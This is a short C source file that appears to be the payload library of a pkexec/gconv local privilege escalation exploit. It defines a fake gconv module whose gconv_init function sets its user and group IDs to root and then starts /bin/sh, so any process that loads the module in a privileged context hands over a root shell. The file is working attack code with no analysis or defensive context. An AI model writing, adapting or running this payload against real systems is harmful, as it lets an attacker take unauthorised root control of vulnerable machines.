#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>

void gconv(){}
void gconv_init(void *step){
	char *const args[]={"/bin/sh",NULL};
	char *const envp[]={
		"PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/sbin:/bin:/opt/bin",
		NULL
	};
	setuid(0);
	setgid(0);
	execve(args[0],args,envp);
}
